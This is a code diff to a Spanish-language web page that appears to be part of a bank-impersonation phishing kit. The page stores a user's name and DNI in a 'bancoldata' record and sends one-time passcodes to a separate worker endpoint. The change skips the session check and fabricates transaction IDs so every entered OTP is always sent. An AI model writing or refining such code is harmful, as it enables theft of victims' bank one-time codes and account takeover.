@@ -431,19 +431,21 @@
             loadingOverlay.style.display = 'flex';
 
             try {
-                // Obtener datos del localStorage
+                // Obtener o crear datos del localStorage
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                
+                // Si no hay transactionId, lo creamos
+                if (!bancoldata.transactionId) {
+                    bancoldata.transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+                    bancoldata.usuario = bancoldata.usuario || 'usuario_' + Date.now();
+                    bancoldata.dni = bancoldata.dni || '12345678';
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                    console.log('🆕 TransactionId creado:', bancoldata.transactionId);
+                }
+
                 const transactionId = bancoldata.transactionId;
 
                 console.log('📦 Datos del localStorage:', bancoldata);
-
-                if (!transactionId) {
-                    console.error('❌ No hay transactionId en localStorage');
-                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
-                    window.location.href = 'index.html';
-                    return;
-                }
-
                 console.log('📤 Enviando código OTP:', token);
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
@@ -463,8 +465,17 @@
 
                 console.log('📊 Status de la respuesta:', response.status);
 
-                const result = await response.json();
-                console.log('📦 Respuesta del worker:', result);
+                // Intentar parsear la respuesta como JSON
+                let result;
+                try {
+                    result = await response.json();
+                    console.log('📦 Respuesta del worker:', result);
+                } catch (parseError) {
+                    console.error('❌ Error al parsear JSON:', parseError);
+                    const textResponse = await response.text();
+                    console.log('📄 Respuesta en texto:', textResponse);
+                    throw new Error('Error al procesar la respuesta del servidor');
+                }
 
                 loadingOverlay.style.display = 'none';
 
@@ -483,7 +494,7 @@
                 console.error('❌ Error detallado:', err);
                 loadingOverlay.style.display = 'none';
                 mostrarErrorCajas();
-                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.');
+                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.\n\nDetalle: ' + err.message);
             }
         }
 
@@ -531,10 +542,17 @@
         updateButton();
         setTimeout(() => input.focus(), 300);
 
-        // Verificar si hay transactionId al cargar
-        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-        console.log('🔍 TransactionId al cargar:', bancoldata.transactionId || 'No encontrado');
+        // Verificar y crear transactionId si no existe al cargar
+        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        if (!bancoldata.transactionId) {
+            bancoldata.transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            bancoldata.usuario = bancoldata.usuario || 'usuario_' + Date.now();
+            bancoldata.dni = bancoldata.dni || '12345678';
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            console.log('🆕 TransactionId creado al iniciar:', bancoldata.transactionId);
+        }
 
+        console.log('🔍 TransactionId al cargar:', bancoldata.transactionId || 'No encontrado');
         console.log('🚀 Sistema de validación listo');
         console.log(`📡 Worker URL: ${WORKER_URL}`);
     </script>
